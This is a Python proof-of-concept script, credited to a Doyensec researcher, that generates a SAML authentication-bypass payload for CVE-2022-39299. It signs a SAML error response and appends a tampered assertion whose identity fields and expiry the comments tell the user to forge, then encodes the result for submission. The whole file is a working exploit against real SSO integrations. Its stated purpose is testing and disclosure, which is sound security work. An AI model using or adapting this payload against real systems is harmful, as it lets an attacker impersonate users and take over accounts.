import re
from lxml import etree
from signxml import XMLSigner, XMLVerifier
import base64
import urllib.parse

print("\n________________________________\nPoC Generator For CVE-2022-39299\nUsable to test SAML SSO Integrations against In-Tenant Authentication Bypass Via Multiple Root Elements\n________________________________\nMade with <3 by anaximander (Francesco Lacerenza) @Doyensec\nBug discovered by Felix Wilhelm\n________________________________\nPayload:\n")
## Loading the base payload, a casual SAML error XML that does NOT contain assertions. Important to bypass assertions number check
with open('base_payload.xml', 'r') as file :
    base_payload = file.read()
## Loading the certificate and key later used to sign the response.
## Also loading the payload appendix, the actual authentication data must be in it. 
## Extract all the info from a valid response (in particular, everything from Subject element to the end of the assertion)
## Note : Paste the extracted content in the given elements within payload_appendix.xml and tamper the email / other info 
## with everything you need. Remember to set all the NotOnOrAfter attributes to a date far in the future
with open("cert.pem", "r") as cert, open("key.pem", "r") as key, open('payload_appendix.xml','r') as appendix:
    certificate = cert.read()
    private_key = key.read()
    payloadappendix = appendix.read()
## Identifying end of error data to place the signature
end = re.search('</samlp:Status>', base_payload).start()
msg = base_payload[:end]
msg = msg +'<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>'
base_payload = msg + base_payload[end:]
base_payload = etree.fromstring(base_payload)
## Signing the root element (err msg) and encoding
signed_base_payload = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#").sign(base_payload, key=private_key, cert=certificate)
signed_base_payload_unicode = etree.tostring(signed_base_payload, encoding='unicode')
## Time to build the final payload by simply appending the tampered assertion to the signed error
final_payload = signed_base_payload_unicode+payloadappendix
## Base64 + URL encoding the payload -> ready to be shipped
final_payload_b64 = base64.b64encode(final_payload.encode('ascii'))
final_payload_b64_url = urllib.parse.quote(final_payload_b64)
print(final_payload_b64_url)